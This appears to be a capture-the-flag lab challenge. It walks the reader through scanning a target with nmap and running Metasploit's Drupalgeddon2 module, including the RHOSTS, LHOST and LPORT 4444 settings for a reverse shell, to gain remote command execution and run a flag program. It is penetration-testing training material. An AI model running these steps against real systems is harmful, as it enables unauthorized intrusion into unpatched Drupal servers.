Use nmap to scan for open ports of the provided host, identify applications running on each port, use Metaploit or a exploit script you find online to take advantage of the first vulnerability.

#### Getting setup
Here are instructions on how to get your pen-tester environment setup:

#### Instructions for Completing the Challenge
- Run nmap
- Run metasploit or a different exploit script to take advantage of a vulnerability in the first identified app
- Execute commands remotely
- Find the flag program in the current directory and use it to sign the challenge salt: `./flag <SALT>`

##### Nmap
Install nmap. You can use a unofficial docker image or install it directly on your VM: 

`docker pull securecodebox/nmap`

For Debian/Ubuntu:

`apt-get install nmap`
 
For RedHat/CentOS:

`rpm -vhU https://nmap.org/dist/nmap-7.80-1.x86_64.rpm`

Once nmap is installed you can scan the target host with `nmap <target_host> -Pn -p-`

##### Metasploit
If you have Docker installed you can simply run the metasploit container image. Here's how to do it:

Pull metasploit docker image from DockerHub

`docker pull metasploitframework/metasploit-framework`

Run metasploit container, forward port 4444 (needed for reverse shell), make sure those ports are open in security groups etc in your metasploit machine

`docker run -it -p 4444-4450:4444-4450 metasploitframework/metasploit-framework`

Search for the exploit you'd like to use based on nmap results, in this challenge look for Drupal exploits

`search drupal`

Select the Drupalgeddon2 exploit from the list

`use exploit/unix/webapp/drupal_drupalgeddon2`

Set the host and port for the attacker's and victim's machine

`set RHOSTS <host>`
`set RPORT <port>`
`set LHOST <remote ip of metasploit machine>`
`set LPORT 4444`

Run the exploit!

`run`

This may fail in some cases, if it fails once reset the LHOST and run again

`set LHOST <remote ip of metasploit machine>`
`run`

You should be able to get shell at this point and run commands in the container. Can you get the flag? Good luck!
